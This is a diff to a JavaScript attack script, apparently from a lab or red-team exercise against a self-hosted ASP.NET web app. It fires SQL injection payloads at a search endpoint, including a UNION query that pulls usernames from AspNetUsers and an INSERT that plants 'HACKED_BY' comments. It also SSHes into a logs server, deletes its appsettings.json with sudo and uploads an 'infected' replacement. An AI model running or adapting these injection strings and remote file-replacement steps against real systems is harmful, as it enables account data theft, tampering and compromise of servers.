@@ -20,13 +20,15 @@ const AttackAPI = async () => {
   let link = "";
   const path = "/home/Search?searchData=";
   while(!success){
-    const query = (Math.floor(Math.random()*100) === 0) ?  `%';Select * from Comments where Comment like '%`: new RandExp('/<([a-z]\w{0,20})>HACK</([a-z]\w{0,20})>/').gen();
+    //const query = (Math.floor(Math.random()*100) === 0) ?  `%';Select * from Comments where Comment like '%`: new RandExp('/<([a-z]\w{0,20})>HACK</([a-z]\w{0,20})>/').gen();
+	const query = (Math.floor(Math.random()*100) === 0) ?  `' UNION ALL SELECT username FROM AspNetUsers;`: new RandExp('/<([a-z]\w{0,20})>HACK</([a-z]\w{0,20})>/').gen();
     console.log("Attacking API with : " + query);
     link = "http://"+API_IP+":"+API_PORT+path+query;
     const request = await f(link, {method : 'GET'});
     try{
       const json = await request.json();
       success = (json.length > 0);
+	  console.log(json);
     }
     catch(err){
       continue;
@@ -35,7 +37,7 @@ const AttackAPI = async () => {
   }
   console.log("FOUND INJECTION BACKDOOR WITH ", link);
   console.log("INJECTING HACKING COOKIE");
-  const hackQuery = "http://"+API_IP+":"+API_PORT+path+`%';INSERT INTO Comments (CommentId,UserId,Comment) VALUES ('HACK','HACK','HACKED_BY_LEPINE');Select * from Comments where Comment like '%`;
+  const hackQuery = "http://"+API_IP+":"+API_PORT+path+`' UNION ALL SELECT username FROM AspNetUsers; INSERT INTO Comments (CommentId,UserId,Comment) VALUES ("HACK1","HACK2","HACKED_BY_HOMICIDAL_FERRET");`;
   await f(hackQuery, {method : 'GET'});
   console.log("Hacked API succesfully");
 }
@@ -53,7 +55,7 @@ const SSHIntoLogs = async () => {
     console.log("FOUND APP FOLDER, SEARCHING DIRECTORY \n\n");
     await ssh.execCommand("ls /app").then(({stdout}) => console.log(stdout));;
     console.log("FOUND CONFIG FILE, DELETING AND REPLACING WITH INFECTED CONFIG");
-    await ssh.execCommand('rm /app/appsettings.json');
+    await ssh.execCommand('sudo rm /app/appsettings.json');
     await ssh.putFile("./infectedAppSettings.json", '/app/appsettings.json');
     console.log("INFECTED LOGS MACHINE")
   }).catch((error) =>{
@@ -66,6 +68,7 @@ const SSHIntoLogs = async () => {
   console.error("LEPINE HACKING BEGINS");
   console.log(API_IP,API_PORT);
   await sleep(10000);
-  AttackAPI();
   SSHIntoLogs();
+  await sleep(10000);
+  AttackAPI();
 })();
